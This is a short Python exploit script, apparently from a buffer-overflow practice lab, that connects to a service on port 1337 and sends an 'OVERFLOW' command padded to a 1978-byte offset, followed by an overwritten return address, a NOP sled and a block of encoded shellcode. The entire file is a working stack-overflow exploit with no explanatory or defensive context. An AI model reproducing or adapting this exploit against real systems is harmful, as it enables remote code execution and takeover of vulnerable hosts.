#!/usr/bin/env python3

import socket

ip = "10.10.134.162"
port = 1337
prefix = "OVERFLOW "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbb\x16\x14\x7e\x43\xdb\xc5\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\x4c\x1a\x9c\xb6\x8c\xca\xe2"
"\x39\x6c\x0b\x83\xb0\x89\x3a\x83\xa7\xda\x6d\x33\xa3\x8e\x81"
"\xb8\xe1\x3a\x11\xcc\x2d\x4d\x92\x7b\x08\x60\x23\xd7\x68\xe3"
"\xa7\x2a\xbd\xc3\x96\xe4\xb0\x02\xde\x19\x38\x56\xb7\x56\xef"
"\x46\xbc\x23\x2c\xed\x8e\xa2\x34\x12\x46\xc4\x15\x85\xdc\x9f"
"\xb5\x24\x30\x94\xff\x3e\x55\x91\xb6\xb5\xad\x6d\x49\x1f\xfc"
"\x8e\xe6\x5e\x30\x7d\xf6\xa7\xf7\x9e\x8d\xd1\x0b\x22\x96\x26"
"\x71\xf8\x13\xbc\xd1\x8b\x84\x18\xe3\x58\x52\xeb\xef\x15\x10"
"\xb3\xf3\xa8\xf5\xc8\x08\x20\xf8\x1e\x99\x72\xdf\xba\xc1\x21"
"\x7e\x9b\xaf\x84\x7f\xfb\x0f\x78\xda\x70\xbd\x6d\x57\xdb\xaa"
"\x42\x5a\xe3\x2a\xcd\xed\x90\x18\x52\x46\x3e\x11\x1b\x40\xb9"
"\x56\x36\x34\x55\xa9\xb9\x45\x7c\x6e\xed\x15\x16\x47\x8e\xfd"
"\xe6\x68\x5b\x51\xb6\xc6\x34\x12\x66\xa7\xe4\xfa\x6c\x28\xda"
"\x1b\x8f\xe2\x73\xb1\x6a\x65\x76\x4f\x77\x9b\xee\x4d\x77\x72"
"\xb3\xd8\x91\x1e\x5b\x8d\x0a\xb7\xc2\x94\xc0\x26\x0a\x03\xad"
"\x69\x80\xa0\x52\x27\x61\xcc\x40\xd0\x81\x9b\x3a\x77\x9d\x31"
"\x52\x1b\x0c\xde\xa2\x52\x2d\x49\xf5\x33\x83\x80\x93\xa9\xba"
"\x3a\x81\x33\x5a\x04\x01\xe8\x9f\x8b\x88\x7d\x9b\xaf\x9a\xbb"
"\x24\xf4\xce\x13\x73\xa2\xb8\xd5\x2d\x04\x12\x8c\x82\xce\xf2"
"\x49\xe9\xd0\x84\x55\x24\xa7\x68\xe7\x91\xfe\x97\xc8\x75\xf7"
"\xe0\x34\xe6\xf8\x3b\xfd\x06\x1b\xe9\x08\xaf\x82\x78\xb1\xb2"
"\x34\x57\xf6\xca\xb6\x5d\x87\x28\xa6\x14\x82\x75\x60\xc5\xfe"
"\xe6\x05\xe9\xad\x07\x0c")

buffer = prefix + overflow + retn + padding + payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")